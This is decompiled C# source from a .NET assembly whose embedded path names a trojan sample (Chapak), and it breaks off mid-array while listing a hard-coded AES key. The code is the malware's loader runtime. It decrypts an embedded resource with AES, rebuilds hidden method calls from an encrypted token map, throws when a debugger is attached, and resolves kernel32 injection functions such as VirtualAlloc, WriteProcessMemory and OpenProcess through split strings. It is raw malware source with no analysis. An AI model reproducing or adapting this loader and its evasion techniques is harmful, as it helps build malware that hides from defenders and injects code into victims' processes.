// Decompiled with JetBrains decompiler
// Type: Wlkxl.Templates.ProxyMockTemplate
// Assembly: Wlkxl, Version=0.3.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 9FA680CB-EE3E-427B-81F6-5826758D2262
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan.MSIL.Chapak.gen-12bce9ebd68668b53ea9b259e06fefad7d4922f9a3d7571769656e7739a466ff.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Wlkxl.Connections;

namespace Wlkxl.Templates
{
  internal class ProxyMockTemplate
  {
    private static bool m_Thread = false;
    private static Assembly m_Identifier = Type.GetTypeFromHandle(Item.AddDecorator(33554444)).Assembly;
    private static uint[] writer = new uint[64]
    {
      3614090360U,
      3905402710U,
      606105819U,
      3250441966U,
      4118548399U,
      1200080426U,
      2821735955U,
      4249261313U,
      1770035416U,
      2336552879U,
      4294925233U,
      2304563134U,
      1804603682U,
      4254626195U,
      2792965006U,
      1236535329U,
      4129170786U,
      3225465664U,
      643717713U,
      3921069994U,
      3593408605U,
      38016083U,
      3634488961U,
      3889429448U,
      568446438U,
      3275163606U,
      4107603335U,
      1163531501U,
      2850285829U,
      4243563512U,
      1735328473U,
      2368359562U,
      4294588738U,
      2272392833U,
      1839030562U,
      4259657740U,
      2763975236U,
      1272893353U,
      4139469664U,
      3200236656U,
      681279174U,
      3936430074U,
      3572445317U,
      76029189U,
      3654602809U,
      3873151461U,
      530742520U,
      3299628645U,
      4096336452U,
      1126891415U,
      2878612391U,
      4237533241U,
      1700485571U,
      2399980690U,
      4293915773U,
      2240044497U,
      1873313359U,
      4264355552U,
      2734768916U,
      1309151649U,
      4149444226U,
      3174756917U,
      718787259U,
      3951481745U
    };
    private static bool dic = false;
    private static bool m_Interceptor = false;
    private static byte[] _Getter = new byte[0];
    private static byte[] configuration = new byte[0];
    private static Dictionary<int, int> m_Attr = (Dictionary<int, int>) null;
    private static object _Connection = new object();
    private static byte[] m_Config = new byte[0];
    private static byte[] watcher = new byte[0];
    private static IntPtr _Error = IntPtr.Zero;
    private static IntPtr m_Specification = IntPtr.Zero;
    private static object property = (object) new string[0];
    private static int[] m_Process = new int[0];
    private static int _Publisher = 1;
    private static bool _Request = false;
    private static SortedList _Importer = new SortedList();
    private static int m_Prototype = 0;
    private static long m_Product = 0;
    internal static ProxyMockTemplate.ServerParameterQueue @ref = (ProxyMockTemplate.ServerParameterQueue) null;
    internal static ProxyMockTemplate.ServerParameterQueue advisor = (ProxyMockTemplate.ServerParameterQueue) null;
    private static long m_Value = 0;
    private static int tests = 0;
    private static bool m_State = false;
    private static bool m_Parser = false;
    private static int m_Comparator = 0;
    private static IntPtr m_Facade = IntPtr.Zero;
    [ProxyMockTemplate.(typeof (ProxyMockTemplate.Attribute.ExporterIdentifierMapping<object>[]))]
    private static bool setter = false;
    internal static Hashtable m_System = new Hashtable();
    private static ProxyMockTemplate.ReaderMockTemplate _Rule = (ProxyMockTemplate.ReaderMockTemplate) null;
    private static ProxyMockTemplate.DecoratorDicWriter filter = (ProxyMockTemplate.DecoratorDicWriter) null;
    private static ProxyMockTemplate.RequestConfigurationConnector iterator = (ProxyMockTemplate.RequestConfigurationConnector) null;
    private static ProxyMockTemplate.Schema listener = (ProxyMockTemplate.Schema) null;
    private static ProxyMockTemplate.ConsumerThreadBridge _Val = (ProxyMockTemplate.ConsumerThreadBridge) null;
    private static ProxyMockTemplate.CollectionWorkerStruct m_Struct = (ProxyMockTemplate.CollectionWorkerStruct) null;
    private static IntPtr pool = IntPtr.Zero;

    static ProxyMockTemplate()
    {
      try
      {
        RSACryptoServiceProvider.UseMachineKeyStore = true;
      }
      catch
      {
      }
    }

    private void VerifyDecorator()
    {
    }

    internal static byte[] TestRules(byte[] reference)
    {
      uint[] numArray1 = new uint[16];
      uint num1 = (uint) ((448 - reference.Length * 8 % 512 + 512) % 512);
      if (num1 == 0U)
        num1 = 512U;
      uint length = (uint) ((ulong) reference.Length + (ulong) (num1 / 8U) + 8UL);
      ulong num2 = (ulong) reference.Length * 8UL;
      byte[] numArray2 = new byte[(IntPtr) length];
      for (int index = 0; index < reference.Length; ++index)
        numArray2[index] = reference[index];
      numArray2[reference.Length] |= (byte) 128;
      for (int index = 8; index > 0; --index)
        numArray2[(long) length - (long) index] = (byte) (num2 >> (8 - index) * 8 & (ulong) byte.MaxValue);
      uint num3 = (uint) (numArray2.Length * 8) / 32U;
      uint num4 = 1732584193;
      uint num5 = 4023233417;
      uint num6 = 2562383102;
      uint num7 = 271733878;
      for (uint index1 = 0; index1 < num3 / 16U; ++index1)
      {
        uint num8 = index1 << 6;
        for (uint index2 = 0; index2 < 61U; index2 += 4U)
          numArray1[(IntPtr) (index2 >> 2)] = (uint) ((int) numArray2[(IntPtr) (num8 + (index2 + 3U))] << 24 | (int) numArray2[(IntPtr) (num8 + (index2 + 2U))] << 16 | (int) numArray2[(IntPtr) (num8 + (index2 + 1U))] << 8) | (uint) numArray2[(IntPtr) (num8 + index2)];
        uint num9 = num4;
        uint num10 = num5;
        uint num11 = num6;
        uint num12 = num7;
        ProxyMockTemplate.DeleteRules(ref num4, num5, num6, num7, 0U, (ushort) 7, 1U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num7, num4, num5, num6, 1U, (ushort) 12, 2U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num6, num7, num4, num5, 2U, (ushort) 17, 3U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num5, num6, num7, num4, 3U, (ushort) 22, 4U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num4, num5, num6, num7, 4U, (ushort) 7, 5U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num7, num4, num5, num6, 5U, (ushort) 12, 6U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num6, num7, num4, num5, 6U, (ushort) 17, 7U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num5, num6, num7, num4, 7U, (ushort) 22, 8U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num4, num5, num6, num7, 8U, (ushort) 7, 9U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num7, num4, num5, num6, 9U, (ushort) 12, 10U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num6, num7, num4, num5, 10U, (ushort) 17, 11U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num5, num6, num7, num4, 11U, (ushort) 22, 12U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num4, num5, num6, num7, 12U, (ushort) 7, 13U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num7, num4, num5, num6, 13U, (ushort) 12, 14U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num6, num7, num4, num5, 14U, (ushort) 17, 15U, numArray1);
        ProxyMockTemplate.DeleteRules(ref num5, num6, num7, num4, 15U, (ushort) 22, 16U, numArray1);
        ProxyMockTemplate.VisitRules(ref num4, num5, num6, num7, 1U, (ushort) 5, 17U, numArray1);
        ProxyMockTemplate.VisitRules(ref num7, num4, num5, num6, 6U, (ushort) 9, 18U, numArray1);
        ProxyMockTemplate.VisitRules(ref num6, num7, num4, num5, 11U, (ushort) 14, 19U, numArray1);
        ProxyMockTemplate.VisitRules(ref num5, num6, num7, num4, 0U, (ushort) 20, 20U, numArray1);
        ProxyMockTemplate.VisitRules(ref num4, num5, num6, num7, 5U, (ushort) 5, 21U, numArray1);
        ProxyMockTemplate.VisitRules(ref num7, num4, num5, num6, 10U, (ushort) 9, 22U, numArray1);
        ProxyMockTemplate.VisitRules(ref num6, num7, num4, num5, 15U, (ushort) 14, 23U, numArray1);
        ProxyMockTemplate.VisitRules(ref num5, num6, num7, num4, 4U, (ushort) 20, 24U, numArray1);
        ProxyMockTemplate.VisitRules(ref num4, num5, num6, num7, 9U, (ushort) 5, 25U, numArray1);
        ProxyMockTemplate.VisitRules(ref num7, num4, num5, num6, 14U, (ushort) 9, 26U, numArray1);
        ProxyMockTemplate.VisitRules(ref num6, num7, num4, num5, 3U, (ushort) 14, 27U, numArray1);
        ProxyMockTemplate.VisitRules(ref num5, num6, num7, num4, 8U, (ushort) 20, 28U, numArray1);
        ProxyMockTemplate.VisitRules(ref num4, num5, num6, num7, 13U, (ushort) 5, 29U, numArray1);
        ProxyMockTemplate.VisitRules(ref num7, num4, num5, num6, 2U, (ushort) 9, 30U, numArray1);
        ProxyMockTemplate.VisitRules(ref num6, num7, num4, num5, 7U, (ushort) 14, 31U, numArray1);
        ProxyMockTemplate.VisitRules(ref num5, num6, num7, num4, 12U, (ushort) 20, 32U, numArray1);
        ProxyMockTemplate.InitRules(ref num4, num5, num6, num7, 5U, (ushort) 4, 33U, numArray1);
        ProxyMockTemplate.InitRules(ref num7, num4, num5, num6, 8U, (ushort) 11, 34U, numArray1);
        ProxyMockTemplate.InitRules(ref num6, num7, num4, num5, 11U, (ushort) 16, 35U, numArray1);
        ProxyMockTemplate.InitRules(ref num5, num6, num7, num4, 14U, (ushort) 23, 36U, numArray1);
        ProxyMockTemplate.InitRules(ref num4, num5, num6, num7, 1U, (ushort) 4, 37U, numArray1);
        ProxyMockTemplate.InitRules(ref num7, num4, num5, num6, 4U, (ushort) 11, 38U, numArray1);
        ProxyMockTemplate.InitRules(ref num6, num7, num4, num5, 7U, (ushort) 16, 39U, numArray1);
        ProxyMockTemplate.InitRules(ref num5, num6, num7, num4, 10U, (ushort) 23, 40U, numArray1);
        ProxyMockTemplate.InitRules(ref num4, num5, num6, num7, 13U, (ushort) 4, 41U, numArray1);
        ProxyMockTemplate.InitRules(ref num7, num4, num5, num6, 0U, (ushort) 11, 42U, numArray1);
        ProxyMockTemplate.InitRules(ref num6, num7, num4, num5, 3U, (ushort) 16, 43U, numArray1);
        ProxyMockTemplate.InitRules(ref num5, num6, num7, num4, 6U, (ushort) 23, 44U, numArray1);
        ProxyMockTemplate.InitRules(ref num4, num5, num6, num7, 9U, (ushort) 4, 45U, numArray1);
        ProxyMockTemplate.InitRules(ref num7, num4, num5, num6, 12U, (ushort) 11, 46U, numArray1);
        ProxyMockTemplate.InitRules(ref num6, num7, num4, num5, 15U, (ushort) 16, 47U, numArray1);
        ProxyMockTemplate.InitRules(ref num5, num6, num7, num4, 2U, (ushort) 23, 48U, numArray1);
        ProxyMockTemplate.EnableRules(ref num4, num5, num6, num7, 0U, (ushort) 6, 49U, numArray1);
        ProxyMockTemplate.EnableRules(ref num7, num4, num5, num6, 7U, (ushort) 10, 50U, numArray1);
        ProxyMockTemplate.EnableRules(ref num6, num7, num4, num5, 14U, (ushort) 15, 51U, numArray1);
        ProxyMockTemplate.EnableRules(ref num5, num6, num7, num4, 5U, (ushort) 21, 52U, numArray1);
        ProxyMockTemplate.EnableRules(ref num4, num5, num6, num7, 12U, (ushort) 6, 53U, numArray1);
        ProxyMockTemplate.EnableRules(ref num7, num4, num5, num6, 3U, (ushort) 10, 54U, numArray1);
        ProxyMockTemplate.EnableRules(ref num6, num7, num4, num5, 10U, (ushort) 15, 55U, numArray1);
        ProxyMockTemplate.EnableRules(ref num5, num6, num7, num4, 1U, (ushort) 21, 56U, numArray1);
        ProxyMockTemplate.EnableRules(ref num4, num5, num6, num7, 8U, (ushort) 6, 57U, numArray1);
        ProxyMockTemplate.EnableRules(ref num7, num4, num5, num6, 15U, (ushort) 10, 58U, numArray1);
        ProxyMockTemplate.EnableRules(ref num6, num7, num4, num5, 6U, (ushort) 15, 59U, numArray1);
        ProxyMockTemplate.EnableRules(ref num5, num6, num7, num4, 13U, (ushort) 21, 60U, numArray1);
        ProxyMockTemplate.EnableRules(ref num4, num5, num6, num7, 4U, (ushort) 6, 61U, numArray1);
        ProxyMockTemplate.EnableRules(ref num7, num4, num5, num6, 11U, (ushort) 10, 62U, numArray1);
        ProxyMockTemplate.EnableRules(ref num6, num7, num4, num5, 2U, (ushort) 15, 63U, numArray1);
        ProxyMockTemplate.EnableRules(ref num5, num6, num7, num4, 9U, (ushort) 21, 64U, numArray1);
        num4 += num9;
        num5 += num10;
        num6 += num11;
        num7 += num12;
      }
      byte[] destinationArray = new byte[16];
      Array.Copy((Array) BitConverter.GetBytes(num4), 0, (Array) destinationArray, 0, 4);
      Array.Copy((Array) BitConverter.GetBytes(num5), 0, (Array) destinationArray, 4, 4);
      Array.Copy((Array) BitConverter.GetBytes(num6), 0, (Array) destinationArray, 8, 4);
      Array.Copy((Array) BitConverter.GetBytes(num7), 0, (Array) destinationArray, 12, 4);
      return destinationArray;
    }

    private static void DeleteRules(
      ref uint last,
      uint pol,
      uint compend,
      uint key2_ID,
      uint result3low,
      ushort no_ord4,
      uint reg5_Z,
      uint[] attr6)
    {
      last = pol + ProxyMockTemplate.PublishRules(last + (uint) ((int) pol & (int) compend | ~(int) pol & (int) key2_ID) + attr6[(IntPtr) result3low] + ProxyMockTemplate.writer[(IntPtr) (reg5_Z - 1U)], no_ord4);
    }

    private static void VisitRules(
      ref uint init,
      uint removeCONNECTIONAt,
      uint controlmax,
      uint insert_SELECTION2At,
      uint insertIVK3At,
      ushort setup4_min,
      uint sum_second5,
      uint[] token6)
    {
      init = removeCONNECTIONAt + ProxyMockTemplate.PublishRules(init + (uint) ((int) removeCONNECTIONAt & (int) insert_SELECTION2At | (int) controlmax & ~(int) insert_SELECTION2At) + token6[(IntPtr) insertIVK3At] + ProxyMockTemplate.writer[(IntPtr) (sum_second5 - 1U)], setup4_min);
    }

    private static void InitRules(
      ref uint v,
      uint flags_cfg,
      uint insert_RULEAt,
      uint remove_DEF2At,
      uint config3_high,
      ushort caller4_length,
      uint caller5,
      uint[] ord6)
    {
      v = flags_cfg + ProxyMockTemplate.PublishRules(v + (flags_cfg ^ insert_RULEAt ^ remove_DEF2At) + ord6[(IntPtr) config3_high] + ProxyMockTemplate.writer[(IntPtr) (caller5 - 1U)], caller4_length);
    }

    private static void EnableRules(
      ref uint key,
      uint pol,
      uint procHigh,
      uint info2,
      uint idx_value3,
      ushort next_info4,
      uint result5min,
      uint[] pol6)
    {
      key = pol + ProxyMockTemplate.PublishRules(key + (procHigh ^ (pol | ~info2)) + pol6[(IntPtr) idx_value3] + ProxyMockTemplate.writer[(IntPtr) (result5min - 1U)], next_info4);
    }

    private static uint PublishRules(uint version_config, ushort pred_Low) => version_config >> 32 - (int) pred_Low | version_config << (int) pred_Low;

    internal static bool StartRules()
    {
      if (!ProxyMockTemplate.dic)
      {
        ProxyMockTemplate.PrintRules();
        ProxyMockTemplate.dic = true;
      }
      return ProxyMockTemplate.m_Interceptor;
    }

    internal static SymmetricAlgorithm VerifyRules()
    {
      if (ProxyMockTemplate.StartRules())
        return (SymmetricAlgorithm) new AesCryptoServiceProvider();
      try
      {
        return (SymmetricAlgorithm) new RijndaelManaged();
      }
      catch
      {
        return (SymmetricAlgorithm) Activator.CreateInstance("System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", "System.Security.Cryptography.AesCryptoServiceProvider").Unwrap();
      }
    }

    internal static void PrintRules()
    {
      try
      {
        ProxyMockTemplate.m_Interceptor = CryptoConfig.AllowOnlyFipsAlgorithms;
      }
      catch
      {
      }
    }

    internal static byte[] PostRules(byte[] task) => !ProxyMockTemplate.StartRules() ? new MD5CryptoServiceProvider().ComputeHash(task) : ProxyMockTemplate.TestRules(task);

    [ProxyMockTemplate.(typeof (ProxyMockTemplate.Attribute.ExporterIdentifierMapping<object>[]))]
    internal static bool ConcatRules(int positionspec)
    {
      if (ProxyMockTemplate.configuration.Length == 0)
      {
        ProxyMockTemplate.GetterThreadDeSerializer threadDeSerializer = new ProxyMockTemplate.GetterThreadDeSerializer(ProxyMockTemplate.m_Identifier.GetManifestResourceStream("{11111-22222-20001-00000}"));
        threadDeSerializer.fHSkdAnkJf().Position = 0L;
        RSACryptoServiceProvider.UseMachineKeyStore = true;
        byte[] parameter = threadDeSerializer.FindParameter((int) threadDeSerializer.fHSkdAnkJf().Length);
        byte[] rgbKey = new ProxyMockTemplate().MoveParameter();
        byte[] rgbIV = new ProxyMockTemplate().ManageParameter();
        byte[] publicKeyToken = ProxyMockTemplate.m_Identifier.GetName().GetPublicKeyToken();
        if (publicKeyToken != null && publicKeyToken.Length > 0)
        {
          rgbIV[1] = publicKeyToken[0];
          rgbIV[3] = publicKeyToken[1];
          rgbIV[5] = publicKeyToken[2];
          rgbIV[7] = publicKeyToken[3];
          rgbIV[9] = publicKeyToken[4];
          rgbIV[11] = publicKeyToken[5];
          rgbIV[13] = publicKeyToken[6];
          rgbIV[15] = publicKeyToken[7];
        }
        SymmetricAlgorithm symmetricAlgorithm = ProxyMockTemplate.VerifyRules();
        symmetricAlgorithm.Mode = CipherMode.CBC;
        ICryptoTransform decryptor = symmetricAlgorithm.CreateDecryptor(rgbKey, rgbIV);
        Stream stream = ProxyMockTemplate.InvokeParameter();
        CryptoStream cryptoStream = new CryptoStream(stream, decryptor, CryptoStreamMode.Write);
        cryptoStream.Write(parameter, 0, parameter.Length);
        cryptoStream.FlushFinalBlock();
        ProxyMockTemplate.configuration = ProxyMockTemplate.RegisterParameter(stream);
        stream.Close();
        cryptoStream.Close();
        threadDeSerializer.RunParameter();
      }
      if (ProxyMockTemplate._Getter.Length == 0)
        ProxyMockTemplate._Getter = ProxyMockTemplate.RateParameter(ProxyMockTemplate.RestartParameter((object) ProxyMockTemplate.m_Identifier).ToString());
      int index = 0;
      try
      {
        index = BitConverter.ToInt32(new byte[4]
        {
          ProxyMockTemplate.configuration[positionspec],
          ProxyMockTemplate.configuration[positionspec + 1],
          ProxyMockTemplate.configuration[positionspec + 2],
          ProxyMockTemplate.configuration[positionspec + 3]
        }, 0);
      }
      catch
      {
      }
      try
      {
        if (ProxyMockTemplate._Getter[index] == (byte) 128)
          return true;
      }
      catch
      {
      }
      return false;
    }

    public static void ViewRules(RuntimeTypeHandle res)
    {
      try
      {
        Type typeFromHandle = Type.GetTypeFromHandle(res);
        if (ProxyMockTemplate.m_Attr == null)
        {
          lock (ProxyMockTemplate._Connection)
          {
            Dictionary<int, int> dictionary = new Dictionary<int, int>();
            BinaryReader binaryReader = new BinaryReader(Type.GetTypeFromHandle(Item.AddDecorator(33554444)).Assembly.GetManifestResourceStream("Record.Queue"));
            binaryReader.BaseStream.Position = 0L;
            byte[] numArray1 = binaryReader.ReadBytes((int) binaryReader.BaseStream.Length);
            binaryReader.Close();
            if (numArray1.Length > 0)
            {
              int num1 = numArray1.Length % 4;
              int num2 = numArray1.Length / 4;
              byte[] numArray2 = new byte[numArray1.Length];
              uint num3 = 0;
              if (num1 > 0)
                ++num2;
              for (int index1 = 0; index1 < num2; ++index1)
              {
                int index2 = index1 * 4;
                uint maxValue = (uint) byte.MaxValue;
                int num4 = 0;
                uint num5;
                if (index1 == num2 - 1 && num1 > 0)
                {
                  num5 = 0U;
                  for (int index3 = 0; index3 < num1; ++index3)
                  {
                    if (index3 > 0)
                      num5 <<= 8;
                    num5 |= (uint) numArray1[numArray1.Length - (1 + index3)];
                  }
                }
                else
                {
                  uint index4 = (uint) index2;
                  num5 = (uint) ((int) numArray1[(IntPtr) (index4 + 3U)] << 24 | (int) numArray1[(IntPtr) (index4 + 2U)] << 16 | (int) numArray1[(IntPtr) (index4 + 1U)] << 8) | (uint) numArray1[(IntPtr) index4];
                }
                uint num6 = num3;
                int num7 = (int) num6;
                int num8 = (int) num6;
                uint num9 = 1324654999;
                uint num10 = 1595287592;
                uint num11 = (uint) num8;
                uint num12 = 838286734;
                uint num13 = 411243370;
                uint num14 = 1148889836;
                uint num15 = (uint) (907949 * ((int) num12 & 4095)) - (num12 >> 12);
                uint num16 = (uint) (160583 * ((int) num9 & 4095)) - (num9 >> 12);
                uint num17 = 47158U * num10 + num13;
                uint num18 = num17 + 125221056U + num17;
                uint num19 = (num17 >> 14 | num17 << 18) + num16;
                uint num20 = num19 & 16711935U;
                uint num21 = (num19 & 4278255360U) >> 8 | num20 << 8;
                uint num22 = num15 + num16;
                uint num23 = num14 ^ num16;
                uint num24 = (num11 ^ num11 >> 25) + num21;
                uint num25 = (num24 ^ num24 << 5) + num22;
                uint num26 = (num25 ^ num25 >> 9) + num23;
                int num27 = (int) (uint) (double) (((num22 << 13) - num18 ^ num22) + num26);
                num3 = (uint) (num7 + num27);
                if (index1 == num2 - 1 && num1 > 0)
                {
                  uint num28 = num3 ^ num5;
                  for (int index5 = 0; index5 < num1; ++index5)
                  {
                    if (index5 > 0)
                    {
                      maxValue <<= 8;
                      num4 += 8;
                    }
                    numArray2[index2 + index5] = (byte) ((num28 & maxValue) >> num4);
                  }
                }
                else
                {
                  uint num29 = num3 ^ num5;
                  numArray2[index2] = (byte) (num29 & (uint) byte.MaxValue);
                  numArray2[index2 + 1] = (byte) ((num29 & 65280U) >> 8);
                  numArray2[index2 + 2] = (byte) ((num29 & 16711680U) >> 16);
                  numArray2[index2 + 3] = (byte) ((num29 & 4278190080U) >> 24);
                }
              }
              byte[] buffer = numArray2;
              int num30 = buffer.Length / 8;
              ProxyMockTemplate.GetterThreadDeSerializer threadDeSerializer = new ProxyMockTemplate.GetterThreadDeSerializer((Stream) new MemoryStream(buffer));
              for (int index = 0; index < num30; ++index)
              {
                int key = threadDeSerializer.CollectParameter();
                int num31 = threadDeSerializer.CollectParameter();
                dictionary.Add(key, num31);
              }
              threadDeSerializer.RunParameter();
            }
            ProxyMockTemplate.m_Attr = dictionary;
          }
        }
        foreach (FieldInfo field in typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField))
        {
          int metadataToken1 = field.MetadataToken;
          int num = ProxyMockTemplate.m_Attr[metadataToken1];
          bool flag = (num & 1073741824) > 0;
          int metadataToken2 = num & 1073741823;
          MethodInfo methodInfo = (MethodInfo) Type.GetTypeFromHandle(Item.AddDecorator(33554444)).Module.ResolveMethod(metadataToken2, typeFromHandle.GetGenericArguments(), new Type[0]);
          if (methodInfo.IsStatic)
          {
            field.SetValue((object) null, (object) Delegate.CreateDelegate(field.FieldType, methodInfo));
          }
          else
          {
            ParameterInfo[] parameters = methodInfo.GetParameters();
            int length = parameters.Length + 1;
            Type[] parameterTypes = new Type[length];
            parameterTypes[0] = !methodInfo.DeclaringType.IsValueType ? Type.GetTypeFromHandle(Item.AddDecorator(16777236)) : methodInfo.DeclaringType.MakeByRefType();
            for (int index = 0; index < parameters.Length; ++index)
              parameterTypes[index + 1] = parameters[index].ParameterType;
            DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, methodInfo.ReturnType, parameterTypes, typeFromHandle, true);
            ILGenerator ilGenerator = dynamicMethod.GetILGenerator();
            for (int index = 0; index < length; ++index)
            {
              switch (index)
              {
                case 0:
                  ilGenerator.Emit(OpCodes.Ldarg_0);
                  break;
                case 1:
                  ilGenerator.Emit(OpCodes.Ldarg_1);
                  break;
                case 2:
                  ilGenerator.Emit(OpCodes.Ldarg_2);
                  break;
                case 3:
                  ilGenerator.Emit(OpCodes.Ldarg_3);
                  break;
                default:
                  ilGenerator.Emit(OpCodes.Ldarg_S, index);
                  break;
              }
            }
            ilGenerator.Emit(OpCodes.Tailcall);
            ilGenerator.Emit(flag ? OpCodes.Callvirt : OpCodes.Call, methodInfo);
            ilGenerator.Emit(OpCodes.Ret);
            field.SetValue((object) null, (object) dynamicMethod.CreateDelegate(typeFromHandle));
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    private static uint RevertRules(uint resID) => (uint) "{11111-22222-10009-11111}".Length;

    private static uint ValidateParameter(uint idx_reference) => (uint) "{11111-22222-10009-11112}".Length;

    internal static void SetParameter()
    {
      if (Debugger.IsAttached)
        throw new Exception("Debugger Detected");
    }

    [ProxyMockTemplate.(typeof (ProxyMockTemplate.Attribute.ExporterIdentifierMapping<object>[]))]
    internal static string DestroyParameter(string task)
    {
      "{11111-22222-50001-00000}".Trim();
      byte[] bytes = Convert.FromBase64String(task);
      return Encoding.Unicode.GetString(bytes, 0, bytes.Length);
    }

    private static int CompareParameter() => 5;

    private static void PushParameter()
    {
      try
      {
        RSACryptoServiceProvider.UseMachineKeyStore = true;
      }
      catch
      {
      }
    }

    private static Delegate ResetParameter(IntPtr v, Type cfg) => (Delegate) __nonvirtual (Type.GetTypeFromHandle(Item.AddDecorator(16777305)).GetMethod("GetDelegateForFunctionPointer", new Type[2]
    {
      Type.GetTypeFromHandle(Item.AddDecorator(16777243)),
      Type.GetTypeFromHandle(Item.AddDecorator(16777249))
    })).Invoke((object) null, new object[2]
    {
      (object) v,
      (object) cfg
    });

    internal static object RestartParameter(object ident)
    {
      try
      {
        if (File.Exists(((Assembly) ident).Location))
          return (object) ((Assembly) ident).Location;
      }
      catch
      {
      }
      try
      {
        if (File.Exists(((Assembly) ident).GetName().CodeBase.ToString().Replace("file:///", "")))
          return (object) ((Assembly) ident).GetName().CodeBase.ToString().Replace("file:///", "");
      }
      catch
      {
      }
      try
      {
        if (File.Exists(ident.GetType().GetProperty("Location").GetValue(ident, new object[0]).ToString()))
          return (object) ident.GetType().GetProperty("Location").GetValue(ident, new object[0]).ToString();
      }
      catch
      {
      }
      return (object) "";
    }

    [DllImport("kernel32", EntryPoint = "LoadLibrary")]
    public static extern IntPtr ComputeParameter(string ident);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    public static extern IntPtr ForgotParameter(IntPtr instance, string col);

    private static IntPtr PrepareParameter(IntPtr reference, string counter, uint state_Y)
    {
      if (ProxyMockTemplate._Rule == null)
        ProxyMockTemplate._Rule = (ProxyMockTemplate.ReaderMockTemplate) Marshal.GetDelegateForFunctionPointer(ProxyMockTemplate.ForgotParameter(ProxyMockTemplate.so8WHSBJcy(), "Find ".Trim() + "ResourceA"), Type.GetTypeFromHandle(Item.AddDecorator(33554453)));
      return ProxyMockTemplate._Rule(reference, counter, state_Y);
    }

    private static IntPtr CallParameter(
      IntPtr init,
      uint b_High,
      uint index_util,
      uint meancfg2)
    {
      if (ProxyMockTemplate.filter == null)
        ProxyMockTemplate.filter = (ProxyMockTemplate.DecoratorDicWriter) Marshal.GetDelegateForFunctionPointer(ProxyMockTemplate.ForgotParameter(ProxyMockTemplate.so8WHSBJcy(), "Virtual ".Trim() + "Alloc"), Type.GetTypeFromHandle(Item.AddDecorator(33554454)));
      return ProxyMockTemplate.filter(init, b_High, index_util, meancfg2);
    }

    private static int SortParameter(
      IntPtr var1,
      IntPtr selection,
      [In, Out] byte[] third,
      uint no__reference2,
      out IntPtr config3)
    {
      if (ProxyMockTemplate.iterator == null)
        ProxyMockTemplate.iterator = (ProxyMockTemplate.RequestConfigurationConnector) Marshal.GetDelegateForFunctionPointer(ProxyMockTemplate.ForgotParameter(ProxyMockTemplate.so8WHSBJcy(), "Write ".Trim() + "Process ".Trim() + "Memory"), Type.GetTypeFromHandle(Item.AddDecorator(33554455)));
      return ProxyMockTemplate.iterator(var1, selection, third, no__reference2, out config3);
    }

    private static int InsertParameter(IntPtr last, int sumcol, int filter_min, ref int second2)
    {
      if (ProxyMockTemplate.listener == null)
        ProxyMockTemplate.listener = (ProxyMockTemplate.Schema) Marshal.GetDelegateForFunctionPointer(ProxyMockTemplate.ForgotParameter(ProxyMockTemplate.so8WHSBJcy(), "Virtual ".Trim() + "Protect"), Type.GetTypeFromHandle(Item.AddDecorator(33554456)));
      return ProxyMockTemplate.listener(last, sumcol, filter_min, ref second2);
    }

    private static IntPtr ListParameter(uint previous_last, int column_second, uint c_low)
    {
      if (ProxyMockTemplate._Val == null)
        ProxyMockTemplate._Val = (ProxyMockTemplate.ConsumerThreadBridge) Marshal.GetDelegateForFunctionPointer(ProxyMockTemplate.ForgotParameter(ProxyMockTemplate.so8WHSBJcy(), "Open ".Trim() + "Process"), Type.GetTypeFromHandle(Item.AddDecorator(33554457)));
      return ProxyMockTemplate._Val(previous_last, column_second, c_low);
    }

    private static int ChangeParameter(IntPtr spec)
    {
      if (ProxyMockTemplate.m_Struct == null)
        ProxyMockTemplate.m_Struct = (ProxyMockTemplate.CollectionWorkerStruct) Marshal.GetDelegateForFunctionPointer(ProxyMockTemplate.ForgotParameter(ProxyMockTemplate.so8WHSBJcy(), "Close ".Trim() + "Handle"), Type.GetTypeFromHandle(Item.AddDecorator(33554458)));
      return ProxyMockTemplate.m_Struct(spec);
    }

    [SpecialName]
    private static IntPtr so8WHSBJcy()
    {
      if (ProxyMockTemplate.pool == IntPtr.Zero)
        ProxyMockTemplate.pool = ProxyMockTemplate.ComputeParameter("kernel ".Trim() + "32.dll");
      return ProxyMockTemplate.pool;
    }

    [ProxyMockTemplate.(typeof (ProxyMockTemplate.Attribute.ExporterIdentifierMapping<object>[]))]
    private static byte[] RateParameter(string info)
    {
      byte[] buffer;
      using (FileStream fileStream = new FileStream(info, FileMode.Open, FileAccess.Read, FileShare.Read))
      {
        int offset = 0;
        int length = (int) fileStream.Length;
        buffer = new byte[length];
        int num;
        for (; length > 0; length -= num)
        {
          num = fileStream.Read(buffer, offset, length);
          offset += num;
        }
      }
      return buffer;
    }

    private static Stream InvokeParameter() => (Stream) new MemoryStream();

    private static byte[] RegisterParameter(Stream asset) => ((MemoryStream) asset).ToArray();

    [ProxyMockTemplate.(typeof (ProxyMockTemplate.Attribute.ExporterIdentifierMapping<object>[]))]
    private static byte[] InterruptParameter(byte[] config)
    {
      Stream stream = ProxyMockTemplate.InvokeParameter();
      SymmetricAlgorithm symmetricAlgorithm = ProxyMockTemplate.VerifyRules();
      symmetricAlgorithm.Key = new byte[32]
      {
        (byte) 123,
        (byte) 5,
        (byte) 74,
        (byte) 12,
        (byte) 244,
